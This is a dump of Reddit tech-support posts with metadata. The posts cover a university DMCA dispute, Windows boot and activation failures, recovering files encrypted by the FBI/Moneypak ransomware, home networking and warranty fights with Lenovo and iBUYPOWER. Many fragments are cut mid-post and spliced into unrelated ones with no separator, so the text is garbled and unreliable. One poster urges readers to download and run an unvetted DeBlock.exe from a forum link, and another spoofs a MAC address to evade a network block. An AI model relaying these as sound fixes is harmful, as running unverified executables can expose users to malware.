Each of these letters they showed me has a deadline, a website to visit, and an offer to settle. However, if I were being sued, I do believe I would receive something from a court. A lot of resources I read said to never visit those websites or give any settlement without receiving a court-issued lawsuit directly in your name, and even then, it would be difficult to connect an IP to a person. If they are subpoenaed, they hand the data over to legal and legal would have to work to pinpoint who is most likely to have used the data. Since I'm leaving the University in 2 weeks, and since this port does not require me to log in or provide any personal information to access, the only documentation that this *could* have been me is the fact that I talked to these folks, and in those conversations I completely denied it being my use.

After the meeting, my boss consoled me and said that I must feel violated, having my trust so shattered by others using my space and then being accused of so much more.

Thank you for all your help and support. While these letters sound really threatening and demand I feed the copyright trolls, I don't think anything will come of it."	t5_2qioo	True
1334708569.0	sf4sf	What rights do I have here?	throwitaway098	32	4	26	"So I go to school at a university, and I am supposed to go into a meeting with the IT department tomorrow because of ""copyright infringement issues on my account."" The problem is that they are having me go into this meeting blind... I don't even know what copyright infringement they are talking about, let alone what they intend to do about it.

I had a conversation with someone on the phone, and they told me that I should have received a DMCA request over a month ago (which I never received). I called them at one point when my computer wasn't working, and they found nothing wrong with my IP address, but said there was a problem with my MAC address getting access. They told me they would contact me within 24 hours, but they never did. I waited a few days, then decided to start searching on my own. I found out that it was actually pretty easy to switch my MAC address, so I did.

Now, they are saying that I deliberately ignored a DMCA takedown and that I am trying to ""game the system"" to get around it. It sounds like there is also a lot of adult content they are saying I viewed, which I didn't.

Completely unrelated is the fact that I work at the University as a Resident Advisor (these allegations are purportedly in my own personal space). They set up the meeting to include my supervisor.

All of this is incredibly shameful and looks to be incredibly awkward, especially considering it sounds like they are going to hand reams of paperwork saying I view lots of porn to my boss. I feel like, since I haven't received a DMCA takedown warning at all and I haven't even been informed of what violations I've committed, I feel like personal data (which may not even be mine since they won't show me what it is!) is being paraded around.

I've been thinking of what to say, but it's hard to even predict what's going to happen. I've allowed other people to use my connection, since it's one of the faster ones in the building. Am I still liable for their activity?

Because of my issues, I can't get into my computer to do that. Here is what I do know:

Hardware &amp; Software:
I can't remember the processor type, it was decent three years ago. Bought it with the motherboard, also decent three years ago. Sorry, can take a better look inside the case if the info is needed.
1.5 TB hard disk - Used as main disk, Windows 7 Ultimate and I think this was the computer with the 64 bit operating system, but I wouldn't bet my life on it.
3 TB disk - no OS, just used as file storage

Problem:
Installed Windows 7 updates a few days ago - left it on the login screen after the restart (I'd stolen my keyboard for another computer, too lazy to move it and plug it back in just to input my password). For a few days, when I nudged the desk I noticed it was fine and still on the login screen. Two days ago, I looked over and noticed it had an error message - figured it was probably nothing, restarted the computer. Then the MBR error messages started. 

MBR Error 1 Press any key to boot from floppy.
MBR Error 2 Press any key to boot from floppy.

I unplugged the secondary hard drive so I would know that I was working with the right one. 

Then I started getting messages right after Verifying DMI pool data - cannot load insert system disk

I tried to **reinstall Windows**, but I can't, because it says my 1.5 TB disk only has 3.9 GB of space on it, and I need 5 GB. 

What I've tried:
**BootRec.exe /fixmbr**
*Got a message it wasn't able to complete*

**BootRec.exe /FixBoot**
*Got another error message*

**BootRec.exe /ScanOS**
*Got a message that there was no OS on the system*

I **connected it to my laptop as an external drive**, it showed it as a 1.2 GB drive that could not be initialized (and I could only see it in the Hard Disk management, didn't show up anywhere else). I ran Easy BCD and it didn't see the drive or the MBR on it.

I **ran the recovery disk**, and went through every option. Even though I had an image I made a few months ago with Acronis, it couldn't find it. It also couldn't find the OS to do a system restore. It couldn't automatically fix the problem (details showed everything was fine except the last test, corrupt MBR, which I kinda already figured out). 

Tried to reinstall Windows, and got the aforementioned error about not having enough disk space. It said the drive was only 3.9 GB with 3.9 GB free. 

Honestly, I am tech supported out. I've done so much tech support at work, and at home, and for friends... I'm reasonably good, but I only know so much and I can't stand the troubleshooting anymore!!!! HELP! Please good friends of Reddit. Save my sanity and throw me a direction to go in. 

Most of my stuff on it is backed up, and I can deal with anything if I wind up having to format the whole thing, but damnit, right now formatting isn't even an option and I really don't want to throw away a 1.5 TB drive.

Edit: Ok, I wrote a novel. Instead of a TL;DR, I'm bolding stuff that seems important. 
Edit: I should also add that I went through every option in my BIOS, didn't see anything that looked out of place. 

**FINAL UPDATE**
Thanks for the suggestions, everyone. Ran everything. EVERYTHING. Ubuntu couldn't even see the drive. Even the DBAN could only see 3.9 GB, but estimated 33 hours to nuke the drive. I've officially called it - time of death, March 29 2012, 10:00 PM. (Actually, I'll try nuking it later. I just need to hook up other drives and get something functional again so I can start replacing my lost data. I am SO GLAD I backed most of it up, sad I hadn't quite finished.) Seagate Tools could see the drive, but every single test failed because it couldn't send commands to the drive. 

BUT... thank you!! Despite the lack of success, it was really nice getting some sound advice, I felt less alone.  "	t5_2qioo	True

To-Do List:

- I installed Chrome and she doesn't use it, I'm thinking about changing the icon and getting a skin on it. Importing her data from IE is easy enough. Is it possible to uninstall IE and retain windows functionality?

- Running AVG. Installing all windows updates and configuring her operating system to not check for updates on it's own since she likes to just ignore update notifications anyway. Is Ad-aware still a vital program?

- Disabling all start-ups is a must, but I'm not sure which ones are and aren't vital. I can google any that look suspicious but I'll try to figure out her version of windows tomorrow when I have access to her PC.

- Microsoft Outlook is the worst for her, it took her 15 minutes yesterday just to forward an e-mail. Is there an obvious alternative that can import her old address book and old e-mails?
I'd rather she use a web-based E-mail interface so she can read her e-mails anywhere, but she gets e-mail via our ISP and says the web-interface doesn't work for her but maybe she just hasn't actually tried to use it and missed having access to her contact info.

Any other good pointers on optimizing her PC for word processing, e-mailing, and googling recipes would be appreciated.

I'm not sure if this is the right subreddit, but here goes:

Today I bought a new Samsung Galaxy SII phone.   My friend has one and I was attracted by the nice OS, the cool apps (like voice talk and synching with my email, etc).  I live in china and I bought it at a respectable shop that sells only real electronics.  

Unfortunately it seems like the phone I bought is chock full of stupid Chinese apps I can't delete like sinaweibo and QQ, and the app store only has chinese apps.  I spent a lot of money on this phone and on top of the usual pang I feel when my bank account is low, I now am feeling like I just wasted half my paycheck on something that is no better to me than a $10 nokia candy bar.  

Is there any way I can jailbreak it or install new (american?) software?  I want to get rid of all the superfluous apps and download some ones that I really like.  Does China have the older OS?  my friend's is all zippy while mine is sluggish and stupid.

1318306541.0	l7wga	What's the weirdest/most WTF thing someone's ever told you about while you worked on their computer? (x-post r/computertechs)	deeperkyo	40	13	15	"Here are two stories I can remember off the top of my head: 

**TL:DRs at the bottom**
****
**Story 1:** This one happened about 6 years ago when I was doing a malware removal for a customer I no longer do business with. Nothing bad happened, they just haven't called me out in a while. Anyway, the customer had left because he had errands to run. While I was working on removing the virus, one of the customer's relatives started talking to me. 

He was a relatively young male, probably in his mid-late twenties. At first, he was just talking about regular stuff, asking how business was, what I did for fun, etc. At some point, for reasons entirely unknown to me, the conversion shifted to where he started to talked about how he used to deal cocaine. He talked about how he acquired it, and where he sold it. I sat there thinking, ""*Whoa! Why is he telling me all this?*"", but I needed to get the job done, so I keep plugging away. It seemed like it was some sort of catharsis for him to unload all this information onto me. 

As if things couldn't get any more WTF, he started talking about how he would rob illegal migrant workers. He stated that they always kept cash on themselves because they could not get bank accounts. Then, he detailed an incident where he robbed one of them for $5,000. He said that he had robbed the person at gun point, and shot them in the leg when they did not comply with his initial orders. He knew they would not report the incident because of their illegal status.  

Now I'm like, ""*Dude! This is too much!*"", but again, I decided to go on and finish. At no point in the conversation did the individual seem threatening, otherwise I would have left immediately. He even offered to hook me up at one of the clubs he frequented. I politely declined, finished removing the malware, and left post haste. 
****
**Story 2:** This one happened about 3 years ago. I was doing a malware removal for a soldier. He leaves while I'm working because he has errands to run. While I'm working, his wife, also a soldier, comes in to see what I'm doing. 

I tell her that I'm removing the malware from her husband's computer. She then asks where it might have come from. I give her the usual spiel about downloading music, adult content, email attachments, etc. She says, knowing her husband, that it most likely came from adult content. 

This is where things start to get weird. People usually just say, ""Okay. I'll make sure to not do that in the future."", or something to that effect. Her question to me though was, ""Why do guys like to watch porn?"". ""*Oh god.*"" I thought, ""*How am I supposed to deal with this?*"". I lied. I told her that I didn't watch it myself, and had no idea why other guys did it. Next, she said that her husband was not paying as much attention to her anymore, and that she had recently had a mirror installed on the ceiling for her husband's birthday so that they could watch themselves having sex. ""*TMI!*"" I thought.

I already new that I was on Weird Ave., but I had no idea the conversation would take a left turn onto W.T.F. Street. She then proceeds to tell me that she was raped in Iraq, and that the child she was holding was the product of that rape. ""*[W.T.F.!](http://s3.amazonaws.com/kym-assets/entries/icons/original/000/005/545/OpoQQ.jpg?1302279173) TMI! TMI!*"" I thought. I did not know how to respond to
that. I just told her that I was sorry to hear that, proceeded to finish the job, and left. 
****
**Story 1 TL;DR:** Guy tells me that he used to sell cocaine, and rob illegal immigrants at gunpoint.

**Story 2 TL;DR:** Woman soldier asks why guys watch porn, says she bought a ceiling mirror so she could watch herself have sex with her husband, and says she had a child from being raped in Iraq.

I've had this problem for a little while, and I can't figure out what is causing it. After I boot into my machine, after about 2 hours I'll get two loud beeps. Then for every two hours after that, the beeps again. The beeps aren't coming from my onboard speaker, they come from whatever audio device I'm using at the time (headphones or speaker). The beeps occur whether I'm playing a game, or if I turn the machine on and leave it while I'm in another room. Nothing I do causes the beeps, and nothing I do makes the beeps go away. 

Item List is:
* Win 7 64-bit installed on a 512GB SSD
* 2 1TB Mirrored HDD
* 1 2TB HDD
* Intel Core2 Quad q9400 CPU
* Gigabyte GA-EP45-DS3L motherboard
* 4GB G-Skill DDR2 RAM
* GTX 570
* All in a Cooler Master HAF 922 case
* with a 750W Corsair PSU

I can't remember exactly when the beeps started, but it's definitely since I put the SSD in and did a fresh install. I thought that might be the problem, since duh, it's the only thing that changed. However, there are no problems other than the beeping. It's been a few months since the installation, so it doesn't effect my gaming or work.

1362499882.0	19pnbj	"""This copy of Windows is not genuine"""	rough_outline	36	9	58	"So I've got an Acer desktop that came pre-installed with windows vista on the hard drive. The hard drive stopped working, I replaced the hard-drive and used a windows 7 upgrade disc to install windows 7 onto the new blank hard drive.

I tried to validate using both the product keys from the desktop and from the upgrade disc. But because I used an upgrade disc when no pre-existing OS was on the hard drive, it's saying I can't validate.

It's saying I have to install vista or fully purchase windows 7. I can't install vista because it came pre-installed on a broken hard-drive and I'm going to buy windows 7 because I've already bought the upgrade.

Is there a way to solve this for free or relatively cheaply?

UPDATE - I tried using a windows vista recovery disk to install vista, it didn't work but it wiped the hard drive so i had to re-install windows 7.

I re-installed windows 7 but installed the 64-bit version (first time i did the 32 bit version) and even though i didn't enter an activation code, it's not coming up with messages or saying it's not genuine.

I've managed to do windows updates, install MSE so its all good, thanks for help though.

UPDATE 2 - So after update 1, it wasn't actually activated, instead it just wasn't bugging me about activating so i thought it was activated. i put the product key from the windows 7 upgrade pack and hey-presto, it worked, [slightly embarrassing](http://fc01.deviantart.net/fs71/f/2010/348/8/6/i_ain__t_even_mad_by_terribleprincess-d34w0sy.jpg) but it's now properly sorted.

Don't put in the product key during the install, don't even attempt and untick the box to register online as well, then once the OS install is complete, activate by doing computer&gt;system properties and follow the activation instructions at the bottom.

After he sold it to me he asked if he could clean the drive so that it'd be fresh for me. He tried using device manager to do a quick wipe, but that didn't work.

So he went into cmd and used the diskpart program to clean the drive. Unfortunately, we had to stop the process about a half hour in because he had to unexpectantly leave.

He stopped the batch process with CTRL+C, and disabled it in the device manager before he disconnected as well.

Now I've got it plugged in to my own system, and I'm having a bit of a problem. I can't explore the drive because it doesn't show up in My Computer, and when I go into the device manager, it doesn't show any of the info on the Volumes tab.

I havent tried to boot from it, but I'm not really looking to use it as a bootable drive, but more for data storage.

I'm not to familiar with the batch commands in the command line DISKPART, but even if someone could tell me how to finish the job he started through that would be great, and if that would be enough for it to appear in My Computer as another HDD.

It works fine on 3G.  I have tried it from all of my devices (phone, iPad, laptop PC, and Mac), and it will not come up on any of them when connected to wifi.

I logged into our network settings to see if somebody was playing a prank on me or something, checked the blocked websites and there are no sites blocked.

I've tried restarting and finally completely resetting the router several times.  We have FIOS.  What the hell is going on??

ETA - all other websites work fine.  It is only reddit that is broken for us.

Edit 2: had a little chat with Fios support and they had me trace the route for reddit.  They then had me try theproxyninja.com to try to access the site.  It worked, so their conclusion was that Verizon's proxy servers are not compatible with Reddit's and suggested I use a proxy from now on.

If this is the case, it means Reddit changed something recently, and I would say there would be way more people than only myself having this problem...

I'm nearing the end of my minimal technical knowledge, any ideas on a fix?	eggson	37	11	25	"**Edit** **Solved** Apparently crucial SSDs had a bug that would cause them to reset every hour after ~5200 hours of use. A firmware update to the SSD solved the issue. Thank all for your help.

System Specs:

* i5-2500k 3.3Ghz
* Gigabyte GA-Z68A mobo
* 64GB SSD running Win7 64bit Home edition
* 500GB WD HDD 
* 8GB DDR3 1333
* GTX 550 Ti 
* 650W psu


I built this computer ~1 year ago, it has been working great the entire time. I play a lot of different games on this, but nothing too taxing or on high settings. 3 days ago however, it started giving me fits. 

I was online, and out of the blue it completely froze. I couldn't alt-tab, ctrl+alt+del, couldn't close any windows or access the start menu at all. The mouse could move, but nothing else worked. So I just turned it off and restarted it fine. It was late so went to bed shortly after. The next day it did it again, same exact scenario: online, maybe 3 tabs open, nothing else running and it completely froze. I restarted it and everything seemed to be fine. Almost an hour later, it froze again. 
Fast forward to today and it still continues, completely freezing exactly an hour to the minute after I restart it. It doesn't matter if I'm using the computer or not, after exactly 1 hour it freezes for 2-3 minutes, goes to black screen, then reboots. If I don't hit the power button, it reboots itself, but hangs on the mobo post screen, sometimes it asks to repair the OS, sometimes it reboots normally, sometimes I have to manually hit the power button and restart it. 

I checked the event viewer and after each restart it says, ""Kernel-Power"" code 41, event 67. But this doesn't really tell me much, just that I had to restart the computer without properly shutting it down first. 

Steps I've taken to try to solve the issue:

* Full system scan for virus/malware, both clean
* SMART scan of both SSD and HDD, both clean
* Repair install of OS
* Backed up system SSD to external HDD, then fresh install of OS
* Replaced PSU with older 550W one from last PC build
* removed graphics card and ran on-board graphics
* removed 1 stick of RAM, then switched the sticks.
* removed HDD and unplugged network.


None of this has changed the behavior. 1 hour of running fine, then frozen, then glitchy rebooting. I'm about at the end of my technical knowledge, but would like to avoid taking it in to a repair tech, since my time and money are in short supply. 

Any ideas on what the issue could be and any other fairly simple steps I could take to diagnosing the issue? I'm on my laptop at school atm, but can post any other info needed later tonight.

I found a lead on a forum that said to look for Initia1Log.txt.block, and googling that filename I found this gem (translated from Spanish):

http://translate.googleusercontent.com/translate_c?depth=1&amp;ei=Q3rOUJeXLcqprQGT4YC4Aw&amp;hl=en&amp;prev=/search%3Fq%3DInitia1Log.txt.block%26hl%3Den%26client%3Dfirefox-a%26hs%3DYV6%26tbo%3Dd%26rls%3Dorg.mozilla:en-US:official%26channel%3Drcs&amp;rurl=translate.google.com&amp;sl=es&amp;twu=1&amp;u=http://www.forospyware.com/t448113.html&amp;usg=ALkJrhjhBwm12MZikv5yleMyQr_GVhepQQ

There is a file attached called DeBlock.exe.  As long as you still have two files called ok.txt.block and Initia1Log.txt.block, download this file, run it and you should be golden.  It worked like a charm for me and I am thrilled to be able to give the user back their thousands of personal files/pics.  

-----------------------------

I've gotten a pc that was hit with the FBI/Moneypak trojan.  After unsuccessfully trying to boot up (could not even get into safe mode or a cmd prompt without the FBI/ransom splash screen locking the pc, and Kaspersky's Winunlocker did nothing), no system restore points were being found, and after trying to repair the Windows installation  I was stuck in the infinite loop of restart/Windows did not start successfully/Windows could not repair this computer/restart.  So I got in with Hiren's Boot CD/Mini XP and started copying off user files, but noticed a lot of them ended with the "".block"" extension, and then saw lots of ""WARNING.txt"" files explaining the files had been encrypted until the ransom was paid (yeah, right).  I was able to reinstall Windows and now am attempting to recover the "".block""ed files.

I haven't been able to find much about cracking this online (lots of other poor lost souls with no answers) except that it may utilize a random key stored on the server the pc was communicating with while infected.  te94decryptor.exe with -k 85 and -k 186 so far turned up nothing, and Avira Ransom File Unlocker and RannohDecryptor will not attempt to decrypt because I don't have a matching encrypted/unencrypted file pair - the few instances I could find, the programs complained that the files were not the same size, and they're not, since the encrypted files are ~100 or so bytes larger than the unencrypted ones.  I can't be sure they are exact matches but they were found in the same directories, existing side-by-side (.block extension and .txt extension in these cases).

At this point I'm not sure what else to do - does anyone have any tips for what I could do next, or any success stories for cracking this thing?"	t5_2qioo	True

[plz help] [time sensitive]	ghandiburger	39	13	42	"I'm moving into a large house comprised of two separate apartments with some college friends. The house has three floors and all three will be occupied by 2 or more people. The 8 of us are going to share a single Internet connection to keep things cheap. I get to be responsible for getting the house networked. Naturally, this needs to be done sooner rather than later because we're subletting the house for the summer...

I have two ideas, but not the technical knowledge to know which is better (or realize if there are other, better, options).

Option 1: Modem -&gt; Switch -&gt; 2 wireless routers, one in each apartment, each broadcasting a different network.
Guarantee full signal strength throughout. But would all the extra hardware slow things down? This seems preferable, considering there will probably be more than one or two Xboxes in the house. 
Two networks, 4 laptops on each.

Option 2: Modem -&gt; Wireless Router in one apartment -&gt; Wireless range extender or something similar
Less hardware so it's cheaper. Should still guarantee full signal strength throughout.
1 network, 8 connected laptops.

Any hardware suggestions are greatly appreciated. We're all 802.11n capable.

She held back from getting a new phone with internet access in anticipation of this, yet now she doesn't even use the access because she's afraid that her workplace will monitor her usage and she'll get in trouble. According to my mom, her workplace (or a company hired by them) monitors the office computer usage every night and blocks any sites they missed or any new sites for the next day's use. Also, they apparently hired a tech firm to do the same just before they began giving phones with online access.

I did try that, however the memory usage creeped up very quickly, untill it was over 4gb(!) and it was still finding files (I only have 8gb of ram). I tried teracopy, however that crashed with an out of memory exception very quickly.

You'll note that it's on the desktop, this is because I was backing up my profile, so I'm not sure why it moved fine, but is unable to delete it. Something else to note is that they seem to form a database, however unlike most databases which are in a single file, this one seems to have unpacked itself?

So, does anyone have any suggestions on how to delete the contents of this folder, preferably without just letting it run over night (although I'll try that as a last resort).

I spilled tea on my monitor, and much to my dismay, there are now large bloody faded white patches on the bottom of the screen. Here's an image of the damage, and what I hope to fix:

http://i.imgur.com/am2qo.jpg

I absolutely do not have the money to replace the monitor, and I'm not finished paying off the damned thing (It's not however on warranty, because I bought it second hand. Silly me, right?)
If there's any way I could fix the issue in a somewhat timely fashion, it would be a godsend. Currently I've got a incandescent 100w bulb shining on the affected area, as per limited research I've done on repairing it. 
The damage happened about five hours ago. Since then, I've had a house fan blowing on it whilst it was upside down. I only recently (A half hour ago) set a light on it. I could be mistaken, and the light could be doing nothing -Which is likely- and I could be out of 300$ for a stupid mistake (Such being spilling tea on it) on my part.


Is there anything I can/should be doing to repair the damaged area? its about six inches wide, and one to four high, varying. Its not blatantly white, which it was a few hours ago. It seems to have dried a bit since I started trying to dry it with a fan/heater/light. I've got no idea what I'm doing. Dear god. Help me.


Edit: Update for any still curious; The set up I had put together to eradicate the moisture in the monitor has done its job quite well. I've not turned it on yet, but I pointed a flashlight at an angle where the moisture was (This process was used to check it earlier, after I turned it on like a fool for a second time... *coughcough*) and it appears to be barely there. A few small, circular patches, and nothing more.

So I plugged it in and my computer said it needed to scan it (I’m not that great with computers, and im not sure if it said it was scanning it for any errors in the files or scanning to make sure it was “safe”).
So I allowed it to scan, but probably after half  an hour or more the scan window froze so I waited probably about half an hour to an hour and then plugged it out – I have to admit I did not click the safety eject hard drive button.

So when I plugged it back in, it worked fine and I put 2GB worth of photos on it. And when it was finished transferring the files I clicked on the folder and the folder had weird symbols as the title and there were none of my photos in it and a window popped up and I think it said they were unreadable – (it either said they were encrypted or corrupted.)

I think I may have plugged it out and in again.
And then it said that I needed to format it.
When I clicked format it gave me a list of things I’m not sure what they are or which options to choose.
But when I clicked just “start” from the format menu it said it formatting it will wipe everything from the hard drive.
 
Is there anything I can do? Or do I need to bring it to a data recovery company?
PLEASE PLEASE HELP ME I AM FREAKING OUT.

I have a P8P67 PRO motherboard based PC (my first personally built PC). I decided to ship everything back home in one piece. Upon arrival, the GPU (GTX 580) had ripped the PCI-e slot completely off the motherboard, rendering the whole system useless (I haven't turned it on since to minimize further damage). And no, the power wasn't connected during the shipping process. I would insert the GPU in the other available PCI-e port but the cables from the PSU aren't long enough. Right now, the GPU is separate from the system and not attached.

http://imgur.com/VPWsLmJ

Here are the steps that I think will bring my PC back to life:

1. Call ASUS and see if I still have warranty and if this will be repairable. If not, inquire how much a direct replacement would run me.

2. Call EVGA to see if they can replace the terribly bent bracket on my GTX 580.

3. Put everything back together, update the motherboard and hope there aren't any further issues.

4. Disregard the above steps and buy another P8P67.

What are your thoughts, r/techsuppport?

**UPDATE**: I got the claim approved for my busted motherboard, so they'll reimburse me $100. Better than nothing, I guess. I am searching for a new motherboard right now and the Z77 seems to be compatible with LGA 1155 CPUs, as I have a i5 2500K.

I'm sorry if I sound flustered in this letter, but it's because I was and still am. I spent almost all my savings for personal use on this computer. It ended up costing me around $2500. I thought I would own it for many years and would never need anything else. The following text explains the issue.

""I have owned my first Ibuypower computer for a little over a year now. My computer came to me with problems from the start: The computer would freeze, screen tear, BSOD, and completely restart the system without any warning whatsoever.

I tried updating all my software and all my drivers and nothing changed. I paid over $200 to have another company diagnose my computer and offer me some advice as what to do. After receiving my computer from a company that specializes in repairing computers, my problems persisted. Soon after this I posted a help thread on Reddit.com where I was thankfully contacted by an employee for iBUYPOWER(He seemed very knowledgeable and his account name contained iBUYPOWER before his name. I am assuming he is someone hired by IBUYPOWER. His name: iBUYPOWER-Michael). He told me to inquire about a RMA number and send it to iBUYPOWER when I had written it on the box containing my computer. I waited for a month and received my computer only four or five days ago. When I sent my computer off for repairs to iBUYPOWER about a month ago, I was only two weeks away from my parts warranty ending. During iBUYPOWER's repairing, the warranty ended. I was thrilled to have my computer back four or so days ago. But, the computer is still not working properly. I could not even get to the windows log on screen. My monitor displayed the message of, ""NO SIGNAL"". I tried plugging in the DVI cable into every slot available on my computer. Nothing worked. I continued to replug all the cords and still nothing was getting through. Again, I asked for help with my problem on Reddit's tech support channel. An employee with the account named, iBUYPOWER-Brad, told me to try switching the order testing my graphics cards separately. I opened up my computer and began removing my video cards. After removing the cards, I found that a piece of my motherboard had been broken off. I don't believe this can be my fault as all I did was take my computer inside my house and plug it in. I don't know when this may have happened, but I am getting very frustrated after owning my computer for over a year and not being able to use it. My parts are quickly becoming old age technology. I spent a great deal of time and money into this one machine that I have not been able to use for a year. I would really appreciate having someone I can talk to about this growing pain that is causing multiple problems in my life. Please, I cannot afford to continue spending more money on this computer. I have already spent more than $350 outside of my original payment to iBUYPOWER. I must ask for a refund for the computer, or the shipping, or the broken part I will have to replace, or the damages that my computer was sent to me broken after being declared functional enough to be sent back to me. I think this is a reasonable request that I receive a full refund for all this trouble that this past year has been as a result of this cursed machine.""

1353466757.0	13jo18	Is DD-WRT Dead?	10gistic	32	5	19	"My wife and I just bought our first house, and one of the top things on my list is a bad ass home network.  I had it all planned out.

* Two E4200's running DD-WRT.  One as a gateway, VPN, and SSH; one as a second WAP, maybe doing something else.
* Second SSID (guest) on its own VLAN, with bandwidth control through QOS.  This would need to be tagged and trunked to run between the first and second APs. 
* Maybe a splash page on the guest SSID.  Maybe blocked P2P.  Maybe more.
* Third router, wndr3700 (my current router, running dd-wrt like a boss; bought from Amazon) maybe somewhere in the mix as a client bridge.

I've been crazy excited about all of this, as some of it is new to me and I love learning new stuff.  So I bought my two E4200s from Amazon, making sure to avoid the one labeled version 2, and got one in today.

I fired it up, went straight to the administration page, and tried to start the process (after extensively reading the wiki and required reading) of flashing DD-WRT.  Right away, the initial flash failed.  Immediately, I flipped over the router to examine the sticker to find a nice, tiny, ""v2.""  I knew that was bad news, and a quick Google search confirmed my fears with a ""Good freaking luck"" prognosis.

I love my wndr3700 to death, with a few exceptions (vlan trunking doesn't work: no guest vlan on both APs), so before this I had tried buying a refurb and was stoked about that.  It flashed dd-wrt with no issues.  Five days later, it stopped routing and wifi-ing, though the switch worked fine.  Reboot: no issues.  Three days later, same problem.  Basically, the time gets shorter each cycle.  Apparently, not uncommon, and probably why my refurb was sent back in the first place.  My father-in-law also had the same problem with v1 of the same model.

My parents recently bought the same router new, on my advice, with the intention of putting dd-wrt on it again.  It comes in, I check the sticker, and it's a WNDR3700 V4.  No DD-WRT.

Basically, I love dd-wrt and its capabilities, but every time I try to get a router with advanced features (dual-band gigabit at least, usb is a perk) that would let me do what I want, I get burned.  The good ones have all revved to V2, V4, VWhatever, and don't support it anymore.  Buffalo seems to, but I'm not sure what their implementation looks like and I'm nervous about dropping the money and being disappointed again.  I want all the features of DD-WRT on an advanced modern router, but I'm starting to worry they don't exist.

TL;DR - Do they even make high-end dd-wrt supported routers any more?  I can't for the life of me buy one.  Is Buffalo's DD-WRT any good?  Is there any alternative for a bad ass home network with multiple WAPs, SSIDs, and VLANs, with SSH, VPN, and QoS?"	t5_2qioo	True
1352321708.0	12tfsl	I think Lenovo is trying to scam me, what can I do? (Long read)	replicated	28	2	59	"Backstory: http://forums.lenovo.com/t5/IdeaPad-Y-U-V-Z-and-P-series/Y570-What-can-I-safely-remove-from-start-up/td-p/826205

Basically my laptop was running slow.  I thought if I could remove certain startup programs it would fix it but it only got worse. This hasn't even been a year yet. Turns out later I started getting hard drive error messages suggesting that I get it repaired. I called up Lenovo and sent it out. I ran into some trouble the moment I went to FedEx. They almost refused to pay for the box for me to ship it in. They said that ""they had never seen that before"" talking about free shipping and free box that would otherwise be like $30 I believe. I had to make her read the paper i was emailed. I found that odd.

I noticed that my headphone jack's metal plating on the outside had come off so I left a note for the techs to look into it because I didn't know if it was just for looks or perhaps actually served a purpose (grounding)? Anyway I had done this with apple dozens of times so I expected nothing of it. I sent it off Oct 25. I later checked in, only to find tout my computer was being held hostage basically. Some barely audible woman left me a voice mail suggesting the screen was broken and it was not covered under warranty. What? She said they were holding my laptop until the payment was paid and I had until the 2nd 7th, 5th or 6th depending on your interpretation of what she tried to say in English. Otherwise they'd send it back to me. 

Apparently that was at least one day into the hostage situation. I called them and told them the screen worked fine, when it left my hands at FedEx. After watching the bitter woman at FedEx pack my computer in it's free box I'm pretty sure it was secure. The rep on the phone then told me he actually had a report about the motherboard now which basically still was not covered under warranty. I had to call again to find out that they just decided to replace the entire motherboard all over my question about the little plastic/metallic ring OUTSIDE of the PC.  The headphone jack DID WORK PERFECTLY and this makes me think they never even tried to test it. Anyway because their request was for nearly $400 or so I told them to forget it and just replace my HD! I called to check on it about 2 days later turns out nothing has been done. No updates. No status reports on the progress. 

After about 6-7 calls later, today, I'm now being told that the power outlet does not work and even now, it is still in their factory because that too is not under warranty. I talked to the ""supervisor"" and that was what she told me. I told her that again, when it left my hands the laptop WORKED PERFECTLY. Just the HD error. EVEN THEN IT WAS JUST AN ANNOYING POP UP.. IT STILL WORKED PERFECTLY! My warranty is up in December and I decided to send it in now opposed to being sorry later if it got worse. I told her that the power supply worked fine or else obviously they would not have told me to leave out the battery and power cable in the shipping! 

She did a play on words, which made me suspicious. She said something along the lines of ""I will tell them to cancel the repairs and just focus on the HD *if that is what you want*"". What I want is my HD repaired AND MY PC RETURNED IN WORKING CONDITION LIKE IT WAS WHEN I SENT IT IN. Dont make it sound like I'm telling them to ignore crap if they really did mess it up.. I'm convinced these people do not understand English. I've had to call SO MANY TIMES just to tell them JUST FIX THE HD. THERE IS NO OTHER PROBLEM, BUT THE HD!! I can't understand them on the phone, they can't write emails, they can't understand the pop up (if they turned my PC on) that says the HARD DRIVE needs to be replaced.. Why don't they understand English??

Every time there seems to be some random broken part that is completely out of warranty (they say) and none of these parts they claim even have anything remotely to do with a HD repair! I just want my laptop! They claim to have no number to the facility and what seems to happen is that I call them, I ask about the status. They send out an email to the repair facility asking for an update. Nothing happens. Rinse, wash and repeat.  

What I find strange is ever so often they claim a new part is broken yet other times they claim no updates. Each time they claim to put in for a ""service update"" and each time they claim there was no recent service update. Each time the agents claim to ""take over the case"" and I never get a follow up or email. When I call sometimes I am asked for a service number ""I should have gotten in my email"" and not only is it not in my email but they can't find this alleged email in their system either but I do have a repair order and apparently there is a difference. They say they can't even track via serial number. 

This all just seems like a scam, piss poor customer support and all I want is my laptop repaired and returned in working condition. What can I do because clearly they are trying to get extra money out of me. Ill never shop Lenovo again, I only chose them after coming on here and seeing them being praised. "	t5_2qioo	True

1343661195.0	xe6sj	Advice on reinstalling Windows 7 with a valid product key but no disk	Pro-Frank	36	8	12	"Hey guys I'm just looking for some help/advice with reinstalling Windows 7 on my laptop with my existing and valid product key.  I bought my Asus laptop from Newegg not even a full year ago and last week I started having problems with it booting up, started getting some strange errors but it was still loading windows fine.  Then a few days later it wouldn't load windows at all and started taking me to the system restore menus but I've exhausted all efforts with no success as I foolishly did not create a backup image or make a restore disk at any point.

I contacted ASUS thinking I they would be able to send me a restore disk but I either have to pay $50 for one or look into sending it back in with 12 month warranty.   I don't particularly wish to do either of these as I've wiped previous machines and reinstalled/restored Windows on some of my previous machines and would prefer to just take care of this issue myself unless of course I find out that I've got a failed hard drive on my hands or any other hardware issues that would force me to send it back in under the warranty.

So basically I'm hoping to just be able to wipe everything and reinstall Windows 7 using my product key on the sticker on the bottom of my laptop.  Is this even possible?  I was not provided with a restore disk when I ordered it and instead my computer was set up with a restore partition on the hard drive.  Like I said I have been able to attempt all the restore options with that partition but nothing has worked, so I found a guide online after doing some googling that explains how to go about this process.  I just wanted to get some advice from you guys to see if this is legit and whether it should be a piece of cake or if I'll probably run into problems with using my existing valid product key.  I don't really care about backing up anything at all that is on my current hard drive like important files or drivers or anything like that but it's been quite a long time since I've had to reinstall Windows and have never done it with Windows 7 so will it be okay for me to literally just wipe everything except for my restore partition and just reinstall it fresh with no Asus bloatware and then just update all my drivers once I get it back up and running?

Any help and advice would be greatly appreciated."	t5_2qioo	True

I have spoke to support and billing already and they both admitted to me that they don't have the power to dispute these charges or even rationalize them.

One thing I should note was that upon installation of ConstantGuard it did not appear to actually DO anything, no scans, no identification, no removal, it just stopped that obnoxious image from being juxtaposed over everything I tried to view.

